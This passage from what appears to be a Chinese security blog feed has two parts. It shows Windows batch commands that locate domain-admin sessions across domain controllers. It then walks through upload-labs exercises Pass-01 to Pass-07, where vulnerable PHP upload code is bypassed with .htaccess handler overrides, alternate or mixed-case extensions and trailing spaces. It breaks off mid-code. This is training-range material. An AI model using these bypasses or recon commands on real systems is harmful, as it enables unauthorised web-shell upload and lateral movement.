src="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/image-20240107154441138.png" alt="image-20240107154441138"><br><img src="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/image-20240107154449409.png" alt="image-20240107154449409">这里因为没有会话所以没有内容。</p><p><strong>2.1 查询远程系统中运行的任务</strong><br>如果目标机器在域系统中是通过共享的本地管理员账户运行的，就可以使用下列脚本来查询系统中的域管理任务。<br>首先，从Domain Admins组中收集域管理员列表。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain &gt; admins.txt<br>net group <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain &gt; dcs.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">FOR /F %i <span class="hljs-keyword">in</span> (dcs.txt) DO @<span class="hljs-built_in">echo</span> [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n <span class="hljs-keyword">in</span> (admins.txt) DO @<span class="hljs-built_in">type</span> output.txt | findstr %n &gt; NUL &amp;&amp; <span class="hljs-built_in">echo</span> [!] %n was found running a process on %i &amp;&amp; pause<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/image-20240107154459571.png" alt="image-20240107154459571"></p><p><strong>2.2 扫描远程系统的NetBIOS信息</strong><br>某些版本的Windows操作系统允许用户通过NetBIOS查询已登录用户。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain &gt; admins.txt<br>net group <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain &gt; dcs.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> /F %i <span class="hljs-keyword">in</span> (dcs.txt) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">echo</span> [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n <span class="hljs-keyword">in</span> (admins.txt) DO @<span class="hljs-built_in">type</span> nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; <span class="hljs-built_in">echo</span> [!] %n was found logged into %i<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/image-20240107154508157.png" alt="image-20240107154508157">使用nbtscan工具，就文件与nbtscan工具置于同一目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> /F %i <span class="hljs-keyword">in</span> (dcs.txt) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">echo</span> [+] Checking %i &amp;&amp; nbtscan -f %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n <span class="hljs-keyword">in</span> (admins.txt) DO @<span class="hljs-built_in">type</span> nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; <span class="hljs-built_in">echo</span> [!] %n was found logged into %i<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/image-20240107154516874.png" alt="image-20240107154516874"></p><p>参考：<a href="https://blog.csdn.net/weixin_45007073/article/details/114498146">https://blog.csdn.net/weixin_45007073/article/details/114498146</a></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>域管理员信息</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上次靶场练习</title>
    <link href="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
    <url>/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>注意：这里的环境要为php5.6以下没有nts的<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170012951.png" alt="image-20240107170012951"></p><p><strong>Pass-01</strong><br>直接上传图片码抓包修改后缀即可<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170021394.png" alt="image-20240107170021394"><br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170030055.png" alt="image-20240107170030055"><br><strong>Pass-02</strong><br>同样上传图片码抓包修改后缀即可，比Pass-01多了个对MIME的检测，但对于上传图片码来说就没啥区别<br><strong>Pass-03</strong><br>查看源码<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170041535.png" alt="image-20240107170041535"><br>后台进行了黑名单限制，但是黑名单不完整，常见的可执行PHP文件的后缀：<br>php2、php3、php5、phtml、pht  当然这个的是配置文件里有才行</p><p><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170050213.png" alt="image-20240107170050213"></p><p><strong>Pass-04</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);//删除文件名末尾的点<br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); //转换为小写<br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);//去除字符串::<span class="hljs-variable">$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); //收尾去空<br><br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传!&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以看到这个黑名单黑的很死，但是却漏了htaccess,我们可以上传一个.htaccess的配置文件，从而绕过<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170111977.png" alt="image-20240107170111977"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">SetHandler application/x-httpd-php<br><span class="hljs-comment">#就是让所有的文件都当作php文件解析</span><br></code></pre></td></tr></table></figure><p>此时我们在上传一个图片码就行了<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170123865.png" alt="image-20240107170123865"></p><p><strong>Pass-05</strong><br>看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);//删除文件名末尾的点<br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);//去除字符串::<span class="hljs-variable">$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); //首尾去空<br><br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(1000,9999).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以看出常规的后缀名都禁了，但是可以大小写混写绕过，当然这个目标运行环境得为windows<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170136415.png" alt="image-20240107170136415"></p><p><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170150976.png" alt="image-20240107170150976"><br><strong>Pass-06</strong><br>查看源码，将所有后缀转为小写在比对，所有大小写混写是行不通了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);//删除文件名末尾的点<br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); //转换为小写<br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);//去除字符串::<span class="hljs-variable">$DATA</span><br>        <br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(1000,9999).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>Windows解析特点：如果后缀名的最后一位是空格，系统会自动把空格给删掉<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170200931.png" alt="image-20240107170200931"><br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170208777.png" alt="image-20240107170208777"><br><strong>Pass-07</strong></p><p>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> 